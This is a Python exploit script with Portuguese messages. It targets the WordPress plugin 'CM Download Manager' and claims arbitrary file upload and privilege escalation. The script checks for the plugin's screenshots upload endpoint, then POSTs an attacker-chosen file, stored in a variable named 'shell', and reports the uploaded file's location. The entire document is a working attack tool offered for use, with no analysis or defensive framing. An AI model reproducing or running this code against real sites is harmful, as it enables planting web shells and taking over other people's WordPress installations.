try:
	import requests
except:
	print("Biblioteca 'requests' nao encontrada!\nInstale utilizando: pip install requests.")
	exit()
import sys
import json

index = """
Exploit escrito por supr3m0 & w4rlo6k
    __     __          _                  _____                   
    \ \   / /         | |                / ____|                  
     \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
      \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
       | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
       |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
     www.facebook.com/yunkers01/                  Recoda nao comedia
********************************************************************
Wordpress plugin 'CM Download Manager' > 2.5.11
Falha: Arbitrary File upload & Privilege Escalation

[#] Aguarde(...)
"""
banner = """
Exploit escrito por supr3m0 & w4rlo6k
    __     __          _                  _____                   
    \ \   / /         | |                / ____|                  
     \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
      \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
       | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
       |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
     www.facebook.com/yunkers01/                  Recoda nao comedia
********************************************************************
Wordpress plugin 'CM Download Manager' > 2.5.11
Falha: Arbitrary File upload & Privilege Escalation

[-] Nenhum parametro inserido.
"""

x = sys.argv
script = x[0]

if len(x) < 4:
	print(banner)
	print("execute: python",script, "--url http://localhost/wordpress/", "--arquivo image.jpg")
	exit()
if x[1] == "--url":
	url = x[2]
else:
	print(banner)
	exit()
if x[3] == "--arquivo":
	arquivo = x[4]
else:
	print(banner)
	exit()
if url[:8] != "https://" and url[:7] != "http://":
	print('\n[-] Tipo de URL invalida.')
	print("[!] Insira o protocolo. (http:// ou https://")
	exit()
print(index)

try:
	diretorio = url  + "/cmdownload/screenshots/"
	testa_site = requests.get(diretorio)
	if testa_site.status_code != 404:
		print("[=] Alvo:",url, "\n[=] Arquivo:",arquivo, "\n\n[#] Aplicando exploit(...)")
	else:
		print("[-] Site nao vulneravel.")
		exit()
except:
	print("[-] Erro interno.")
	exit()

try:
	shell = open(arquivo, "rb")
except:
	print("[-] Nao consegui abrir o arquivo.")
	exit()

arquivos = {"upload" : shell}
try:
	injeta = requests.post(diretorio, files=arquivos)
	exploit_erro = "not found"
	if exploit_erro in injeta.text:
		print("[!] Ocorreu um erro ao enviar o arquivo.\nLembrando que o site apenas aceita imagens!")
		print(injeta.text)
		exit()
	else:
		decoda = json.loads(injeta.text)
		print("[+] Exploit executado com sucesso!")
		print("[+] Local do arquivo:",decoda["imgSrc"])
except:
	print("[-] Nao vulneravel")
	exit()